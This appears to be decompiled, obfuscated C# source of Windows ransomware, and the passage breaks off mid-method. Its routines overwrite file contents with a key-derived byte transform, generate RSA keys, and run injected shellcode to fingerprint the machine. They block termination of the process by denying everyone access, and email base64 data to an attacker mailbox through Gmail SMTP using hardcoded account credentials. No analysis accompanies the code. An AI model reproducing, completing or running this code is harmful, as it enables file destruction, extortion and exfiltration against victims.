using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using ns0;
using ns1;
using ns3;
using ns4;
using ns6;

namespace ns5;

internal class Class22
{
	static string smethod_0()
	{
		return Class22.smethod_18("");
	}

	static int smethod_1(Class15.Stream0 stream0_0)
	{
		return Class22.smethod_5(stream0_0) | (Class22.smethod_5(stream0_0) << 16);
	}

	static bool smethod_2(ref byte[] byte_0)
	{
		byte[] array = new byte[26]
		{
			85, 137, 229, 87, 139, 125, 16, 106, 1, 88,
			83, 15, 162, 137, 7, 137, 87, 4, 91, 95,
			137, 236, 93, 194, 16, 0
		};
		byte[] array2 = new byte[19]
		{
			83, 72, 199, 192, 1, 0, 0, 0, 15, 162,
			65, 137, 0, 65, 137, 80, 4, 91, 195
		};
		int int_;
		if (Class22.smethod_49())
		{
			IntPtr intptr_ = new IntPtr(array2.Length);
			if (!Class22.VirtualProtect(array2, intptr_, 64, out int_))
			{
				Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
			}
			return Class22.CallWindowProcW(intptr_1: new IntPtr(byte_0.Length), byte_0: array2, intptr_0: IntPtr.Zero, int_0: 0, byte_1: byte_0) != IntPtr.Zero;
		}
		IntPtr intptr_3 = new IntPtr(array.Length);
		if (!Class22.VirtualProtect(array, intptr_3, 64, out int_))
		{
			Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
		}
		return Class22.CallWindowProcW(intptr_1: new IntPtr(byte_0.Length), byte_0: array, intptr_0: IntPtr.Zero, int_0: 0, byte_1: byte_0) != IntPtr.Zero;
	}

	static byte[] smethod_3(string string_0)
	{
		byte[] array = new byte[string_0.Length * 2];
		Buffer.BlockCopy(string_0.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}

	static RawSecurityDescriptor smethod_4(IntPtr intptr_0)
	{
		byte[] byte_ = new byte[0];
		Class22.GetKernelObjectSecurity(intptr_0, 4, byte_, 0u, out uint uint_);
		if ((long)uint_ > 32767L)
		{
			throw new Win32Exception();
		}
		if (!Class22.GetKernelObjectSecurity(intptr_0, 4, byte_ = new byte[uint_], uint_, out uint_))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(byte_, 0);
	}

	static int smethod_5(Class15.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	unsafe static bool smethod_6(Class15.Class16 class16_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class22.smethod_13(class16_0.class18_0);
		while (num >= 258)
		{
			*(int*)ptr = class16_0.int_4;
			switch (*(int*)ptr)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class22.smethod_29(class16_0.class19_0, class16_0.class17_0)) & -256) == 0)
				{
					Class22.smethod_40(class16_0.class18_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class16_0.int_6 = Class15.Class16.int_0[num2 - 257];
					class16_0.int_5 = Class15.Class16.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class16_0.class19_1 = null;
				class16_0.class19_0 = null;
				class16_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class16_0.int_5 > 0)
				{
					class16_0.int_4 = 8;
					*(int*)((byte*)ptr + 4) = Class22.smethod_12(class16_0.class17_0, class16_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class22.smethod_35(class16_0.class17_0, class16_0.int_5);
					class16_0.int_6 += *(int*)((byte*)ptr + 4);
				}
				class16_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class22.smethod_29(class16_0.class19_1, class16_0.class17_0);
				if (num2 >= 0)
				{
					class16_0.int_7 = Class15.Class16.int_2[num2];
					class16_0.int_5 = Class15.Class16.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class16_0.int_5 > 0)
				{
					class16_0.int_4 = 10;
					*(int*)((byte*)ptr + 8) = Class22.smethod_12(class16_0.class17_0, class16_0.int_5);
					if (*(int*)((byte*)ptr + 8) < 0)
					{
						return false;
					}
					Class22.smethod_35(class16_0.class17_0, class16_0.int_5);
					class16_0.int_7 += *(int*)((byte*)ptr + 8);
				}
				Class22.smethod_37(class16_0.class18_0, class16_0.int_6, class16_0.int_7);
				num -= class16_0.int_6;
				class16_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static bool smethod_7()
	{
		bool createdNew;
		Mutex obj = new Mutex(initiallyOwned: true, "FaturaWalker90912", out createdNew);
		if (!createdNew)
		{
			return false;
		}
		GC.KeepAlive(obj);
		return true;
	}

	static byte[] smethod_8(int int_0, byte[] byte_0, Class0 class0_0, string string_0)
	{
		if (byte_0 != null && byte_0.Length != 0)
		{
			int num = Class22.smethod_39(class0_0, int_0);
			if (byte_0.Length > num)
			{
				throw new ArgumentException($"Maximum data length is {num}", "data");
			}
			if (!Class22.smethod_27(class0_0, int_0))
			{
				throw new ArgumentException("Key size is not valid", "keySize");
			}
			if (string.IsNullOrEmpty(string_0))
			{
				throw new ArgumentException("Key is null or empty", "publicKeyXml");
			}
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_0);
			rSACryptoServiceProvider.FromXmlString(string_0);
			return rSACryptoServiceProvider.Encrypt(byte_0, class0_0.bool_0);
		}
		throw new ArgumentException("Data are empty", "data");
	}

	static string smethod_9()
	{
		return Class22.smethod_0();
	}

	static string smethod_10(int int_0)
	{
		lock (Class14.object_0)
		{
			Class14.dictionary_0.TryGetValue(int_0, out var value);
			if (value != null)
			{
				return value;
			}
		}
		return Class22.smethod_50(int_0);
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] byte[] byte_0);

	static void smethod_11(Class0 class0_0, string string_0)
	{
		Stream stream = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		byte[] array = new byte[1024];
		using (BinaryReader binaryReader = new BinaryReader(stream))
		{
			using BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryReader.BaseStream.Position = 0L;
			array = binaryReader.ReadBytes(1024);
			binaryWriter.BaseStream.Position = 0L;
			array = Class22.smethod_30(Class22.smethod_55(class0_0.method_0(), class0_0), class0_0, array);
			binaryWriter.Write(array);
		}
		stream.Close();
		stream.Dispose();
	}

	static int smethod_12(Class15.Class17 class17_0, int int_0)
	{
		if (class17_0.int_2 < int_0)
		{
			if (class17_0.int_0 == class17_0.int_1)
			{
				return -1;
			}
			class17_0.uint_0 |= (uint)(((class17_0.byte_0[class17_0.int_0++] & 0xFF) | ((class17_0.byte_0[class17_0.int_0++] & 0xFF) << 8)) << class17_0.int_2);
			class17_0.int_2 += 16;
		}
		return (int)(class17_0.uint_0 & ((1 << int_0) - 1));
	}

	static int smethod_13(Class15.Class18 class18_0)
	{
		return 32768 - class18_0.int_1;
	}

	static Class15.Class19 smethod_14(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_4];
		Array.Copy(class20_0.byte_1, class20_0.int_3, array, 0, class20_0.int_4);
		return new Class15.Class19(array);
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetCurrentProcess();

	unsafe static void smethod_15(byte[] byte_0, Class15.Class19 class19_0)
	{
		void* ptr = stackalloc byte[64];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 16) = byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				array[*(int*)((byte*)ptr + 16)]++;
			}
			(*(int*)((byte*)ptr + 12))++;
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 512;
		*(int*)((byte*)ptr + 20) = 1;
		while (*(int*)((byte*)ptr + 20) <= 15)
		{
			array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
			*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
			if (*(int*)((byte*)ptr + 20) >= 10)
			{
				*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
				*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
				*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
			}
			(*(int*)((byte*)ptr + 20))++;
		}
		class19_0.short_0 = new short[*(int*)((byte*)ptr + 4)];
		*(int*)((byte*)ptr + 8) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
			*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
			while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
			{
				class19_0.short_0[Class22.smethod_26(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 40) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 44) = 0;
		while (*(int*)((byte*)ptr + 44) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 48) = byte_0[*(int*)((byte*)ptr + 44)];
			if (*(int*)((byte*)ptr + 48) != 0)
			{
				*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
				*(int*)((byte*)ptr + 52) = Class22.smethod_26(*(int*)ptr);
				if (*(int*)((byte*)ptr + 48) <= 9)
				{
					do
					{
						class19_0.short_0[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 56) = class19_0.short_0[*(int*)((byte*)ptr + 52) & 0x1FF];
					*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
					*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
					do
					{
						class19_0.short_0[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
				}
				array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
			}
			(*(int*)((byte*)ptr + 44))++;
		}
	}

	unsafe static byte[] smethod_16(byte[] byte_0)
	{
		void* ptr = stackalloc byte[16];
		Class15.Stream0 stream = new Class15.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class22.smethod_1(stream);
		int num2 = num >> 24;
		if (num - (num2 << 24) == 8223355)
		{
			switch (num2)
			{
			case 1:
				*(int*)ptr = Class22.smethod_1(stream);
				array = new byte[*(int*)ptr];
				*(int*)((byte*)ptr + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
				{
					*(int*)((byte*)ptr + 8) = Class22.smethod_1(stream);
					*(int*)((byte*)ptr + 12) = Class22.smethod_1(stream);
					byte[] array2 = new byte[*(int*)((byte*)ptr + 8)];
					stream.Read(array2, 0, array2.Length);
					Class22.smethod_59(array, *(int*)((byte*)ptr + 12), *(int*)((byte*)ptr + 4), new Class15.Class16(array2));
					*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 12);
				}
				break;
			default:
				throw new ArgumentOutOfRangeException("version", num2, "Selected compression algorithm is not supported.");
			case 3:
			{
				byte[] byte_ = new byte[16]
				{
					136, 224, 121, 243, 79, 156, 136, 214, 45, 172,
					230, 117, 211, 169, 80, 38
				};
				byte[] byte_2 = new byte[16]
				{
					170, 154, 44, 175, 237, 242, 198, 88, 109, 180,
					251, 66, 230, 147, 119, 69
				};
				using (ICryptoTransform cryptoTransform = Class22.smethod_28(byte_2, bool_0: true, byte_))
				{
					array = Class22.smethod_16(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
				}
				break;
			}
			}
			stream.Close();
			stream = null;
			return array;
		}
		throw new FormatException("Unknown Header");
	}

	static void smethod_17(string string_0, Class0 class0_0)
	{
		Stream stream = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		byte[] array = new byte[stream.Length];
		using (BinaryReader binaryReader = new BinaryReader(stream))
		{
			using BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryReader.BaseStream.Position = 0L;
			array = binaryReader.ReadBytes((int)stream.Length);
			binaryWriter.BaseStream.Position = 0L;
			array = Class22.smethod_30(Class22.smethod_55(class0_0.method_0(), class0_0), class0_0, array);
			binaryWriter.Write(array);
		}
		stream.Close();
		stream.Dispose();
	}

	static string smethod_18(string string_0)
	{
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		if (string_0 == "")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					string_0 = driveInfo.RootDirectory.ToString();
					break;
				}
			}
		}
		if (string_0.EndsWith(":\\"))
		{
			string_0 = string_0.Substring(0, string_0.Length - 2);
		}
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + string_0 + ":\"");
		val.Get();
		string result = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		val.Dispose();
		return result;
	}

	static void smethod_19()
	{
		try
		{
			Class22.smethod_22();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_20(byte[] byte_0, int int_0, int int_1, Class15.Class17 class17_0)
	{
		if (class17_0.int_0 < class17_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class17_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class17_0.int_2);
				class17_0.int_2 += 8;
			}
			class17_0.byte_0 = byte_0;
			class17_0.int_0 = int_1;
			class17_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static int smethod_21(Class15.Class17 class17_0)
	{
		return class17_0.int_1 - class17_0.int_0 + (class17_0.int_2 >> 3);
	}

	static void smethod_22()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class22.smethod_57;
		}
		catch
		{
		}
	}

	static void smethod_23(Class0 class0_0, [Out] int int_0, out string string_0, ref string string_1)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_0);
		string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		string_1 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
	}

	static string smethod_24()
	{
		return Class22.smethod_54();
	}

	static void smethod_25(int int_0, string string_0)
	{
		try
		{
			lock (Class14.object_0)
			{
				Class14.dictionary_0.Add(int_0, string_0);
			}
		}
		catch
		{
		}
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static short smethod_26(int int_0)
	{
		return (short)((Class15.Class21.byte_0[int_0 & 0xF] << 12) | (Class15.Class21.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class15.Class21.byte_0[(int_0 >> 8) & 0xF] << 4) | Class15.Class21.byte_0[int_0 >> 12]);
	}

	static bool smethod_27(Class0 class0_0, int int_0)
	{
		if (int_0 >= 384 && int_0 <= 16384)
		{
			return int_0 % 8 == 0;
		}
		return false;
	}

	static ICryptoTransform smethod_28(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		return bool_0 ? rijndaelManaged.CreateDecryptor(byte_1, byte_0) : rijndaelManaged.CreateEncryptor(byte_1, byte_0);
	}

	unsafe static int smethod_29(Class15.Class19 class19_0, Class15.Class17 class17_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class22.smethod_12(class17_0, 9)) >= 0)
		{
			if ((num2 = class19_0.short_0[num]) >= 0)
			{
				Class22.smethod_35(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class22.smethod_12(class17_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class19_0.short_0[*(int*)ptr | (num >> 9)];
				Class22.smethod_35(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class17_0.int_2;
			num = Class22.smethod_12(class17_0, *(int*)((byte*)ptr + 8));
			num2 = class19_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class22.smethod_35(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class17_0.int_2;
		num = Class22.smethod_12(class17_0, *(int*)((byte*)ptr + 12));
		num2 = class19_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class22.smethod_35(class17_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	unsafe static byte[] smethod_30(byte[] byte_0, Class0 class0_0, byte[] byte_1)
	{
		void* ptr = stackalloc byte[8];
		byte[] array = new byte[byte_1.Length];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < byte_1.Length)
		{
			array[*(int*)((byte*)ptr + 4)] = (byte)(byte_1[*(int*)((byte*)ptr + 4)] + byte_0[*(int*)ptr]);
			if (byte_0[*(int*)ptr + 1] == 0)
			{
				*(int*)ptr = 0;
			}
			else
			{
				(*(int*)ptr)++;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return array;
	}

	static void smethod_31()
	{
		IntPtr currentProcess = Class22.GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = Class22.smethod_4(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		Class22.smethod_48(currentProcess, rawSecurityDescriptor);
	}

	static ResourceManager smethod_32()
	{
		if (Class6.resourceManager_0 == null)
		{
			Class6.resourceManager_0 = new ResourceManager("ns4.Class6", typeof(Class6).Assembly);
		}
		return Class6.resourceManager_0;
	}

	unsafe static bool smethod_33(Class15.Class20 class20_0, Class15.Class17 class17_0)
	{
		void* ptr = stackalloc byte[16];
		while (true)
		{
			*(int*)ptr = class20_0.int_2;
			switch (*(int*)ptr)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 12) = Class15.Class20.int_1[class20_0.int_7];
				int num = Class22.smethod_12(class17_0, *(int*)((byte*)ptr + 12));
				if (num >= 0)
				{
					Class22.smethod_35(class17_0, *(int*)((byte*)ptr + 12));
					num += Class15.Class20.int_0[class20_0.int_7];
					while (num-- > 0)
					{
						byte[] byte_ = class20_0.byte_1;
						*(int*)((byte*)ptr + 8) = class20_0.int_8;
						class20_0.int_8 = *(int*)((byte*)ptr + 8) + 1;
						byte_[*(int*)((byte*)ptr + 8)] = class20_0.byte_2;
					}
					if (class20_0.int_8 == class20_0.int_6)
					{
						return true;
					}
					goto IL_008d;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class22.smethod_29(class20_0.class19_0, class17_0)) & -16) == 0)
				{
					byte[] byte_2 = class20_0.byte_1;
					*(int*)((byte*)ptr + 8) = class20_0.int_8;
					class20_0.int_8 = *(int*)((byte*)ptr + 8) + 1;
					byte_2[*(int*)((byte*)ptr + 8)] = (class20_0.byte_2 = (byte)num2);
					if (class20_0.int_8 == class20_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class20_0.byte_2 = 0;
					}
					class20_0.int_7 = num2 - 16;
					class20_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class20_0.int_8 < class20_0.int_5)
				{
					*(int*)((byte*)ptr + 4) = Class22.smethod_12(class17_0, 3);
					if (*(int*)((byte*)ptr + 4) >= 0)
					{
						Class22.smethod_35(class17_0, 3);
						class20_0.byte_0[Class15.Class20.int_9[class20_0.int_8]] = (byte)(*(uint*)((byte*)ptr + 4));
						class20_0.int_8++;
						continue;
					}
					return false;
				}
				class20_0.class19_0 = new Class15.Class19(class20_0.byte_0);
				class20_0.byte_0 = null;
				class20_0.int_8 = 0;
				class20_0.int_2 = 4;
				goto case 4;
			case 2:
				class20_0.int_5 = Class22.smethod_12(class17_0, 4);
				if (class20_0.int_5 >= 0)
				{
					class20_0.int_5 += 4;
					Class22.smethod_35(class17_0, 4);
					class20_0.byte_0 = new byte[19];
					class20_0.int_8 = 0;
					class20_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class20_0.int_4 = Class22.smethod_12(class17_0, 5);
				if (class20_0.int_4 >= 0)
				{
					class20_0.int_4++;
					Class22.smethod_35(class17_0, 5);
					class20_0.int_6 = class20_0.int_3 + class20_0.int_4;
					class20_0.byte_1 = new byte[class20_0.int_6];
					class20_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class20_0.int_3 = Class22.smethod_12(class17_0, 5);
				if (class20_0.int_3 >= 0)
				{
					class20_0.int_3 += 257;
					Class22.smethod_35(class17_0, 5);
					class20_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_008d:
			class20_0.int_2 = 4;
		}
	}

	static void smethod_34()
	{
		try
		{
			Class13.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_35(Class15.Class17 class17_0, int int_0)
	{
		class17_0.uint_0 >>= int_0;
		class17_0.int_2 -= int_0;
	}

	static void smethod_36(string string_0)
	{
		string body = Convert.ToBase64String(Class22.smethod_3(string_0));
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("TempWorldOff@yandex.com");
		mailMessage.To.Add(new MailAddress("TempWorldOff@yandex.com"));
		mailMessage.Subject = Class22.smethod_45();
		mailMessage.Body = body;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential("0x01f1@gmail.com", "TempWorldOff*1994*TempWorldOff");
		smtpClient.Send(mailMessage);
	}

	static void smethod_37(Class15.Class18 class18_0, int int_0, int int_1)
	{
		if ((class18_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class18_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class18_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class18_0.byte_0, num, class18_0.byte_0, class18_0.int_0, int_0);
				class18_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class22.smethod_46(class18_0, num, int_0);
		}
	}

	static string smethod_38()
	{
		return Class22.smethod_32().GetString("FaturaMessage", Class6.cultureInfo_0);
	}

	static int smethod_39(Class0 class0_0, int int_0)
	{
		if (class0_0.bool_0)
		{
			return (int_0 - 384) / 8 + 7;
		}
		return (int_0 - 384) / 8 + 37;
	}

	static void smethod_40(Class15.Class18 class18_0, int int_0)
	{
		if (class18_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class18_0.byte_0[class18_0.int_0++] = (byte)int_0;
		class18_0.int_0 &= 32767;
	}

	unsafe static int smethod_41(byte[] byte_0, int int_0, Class15.Class18 class18_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class18_0.int_0;
		if (int_0 > class18_0.int_1)
		{
			int_0 = class18_0.int_1;
		}
		else
		{
			*(int*)ptr = (class18_0.int_0 - class18_0.int_1 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class18_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class18_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class18_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class18_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	unsafe static int smethod_42(Class15.Class18 class18_0, Class15.Class17 class17_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class18_0.int_1), Class22.smethod_21(class17_0));
		*(int*)((byte*)ptr + 4) = 32768 - class18_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class22.smethod_47(class17_0, class18_0.byte_0, class18_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class22.smethod_47(class17_0, class18_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class22.smethod_47(class17_0, class18_0.byte_0, class18_0.int_0, int_0);
		}
		class18_0.int_0 = (class18_0.int_0 + *(int*)ptr) & 0x7FFF;
		class18_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	static int smethod_43(Class15.Class18 class18_0)
	{
		return class18_0.int_1;
	}

	static string smethod_44()
	{
		return Class22.smethod_51();
	}

	static string smethod_45()
	{
		return new Class2().string_0;
	}

	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr CallWindowProcW([In] byte[] byte_0, IntPtr intptr_0, int int_0, [In][Out] byte[] byte_1, IntPtr intptr_1);

	static void smethod_46(Class15.Class18 class18_0, int int_0, int int_1)
	{
		while (int_1-- > 0)
		{
			class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[int_0++];
			class18_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	unsafe static int smethod_47(Class15.Class17 class17_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class17_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class17_0.uint_0;
			class17_0.uint_0 >>= 8;
			class17_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class17_0.int_1 - class17_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class17_0.byte_0, class17_0.int_0, byte_0, int_0, int_1);
		class17_0.int_0 += int_1;
		if (((uint)(class17_0.int_0 - class17_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			byte[] byte_ = class17_0.byte_0;
			*(int*)((byte*)ptr + 8) = class17_0.int_0;
			class17_0.int_0 = *(int*)((byte*)ptr + 8) + 1;
			class17_0.uint_0 = byte_[*(int*)((byte*)ptr + 8)] & 0xFFu;
			class17_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static void smethod_48(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!Class22.SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	static bool smethod_49()
	{
		return IntPtr.Size == 8;
	}

	static string smethod_50(int int_0)
	{
		int index = int_0;
		int num = Class14.byte_0[index++];
		int num2;
		if (((uint)num & 0x80u) != 0)
		{
			num2 = ((((uint)num & 0x40u) != 0) ? (((num & 0x1F) << 24) + (Class14.byte_0[index++] << 16) + (Class14.byte_0[index++] << 8) + Class14.byte_0[index++]) : (((num & 0x3F) << 8) + Class14.byte_0[index++]));
		}
		else
		{
			num2 = num;
			if (num2 == 0)
			{
				return string.Empty;
			}
		}
		try
		{
			byte[] array = Convert.FromBase64String(Encoding.UTF8.GetString(Class14.byte_0, index, num2));
			string text = string.Intern(Encoding.UTF8.GetString(array, 0, array.Length));
			if (Class14.bool_0)
			{
				Class22.smethod_25(int_0, text);
			}
			return text;
		}
		catch
		{
			return null;
		}
	}

	static string smethod_51()
	{
		byte[] byte_ = new byte[8];
		if (!Class22.smethod_2(ref byte_))
		{
			return "ND";
		}
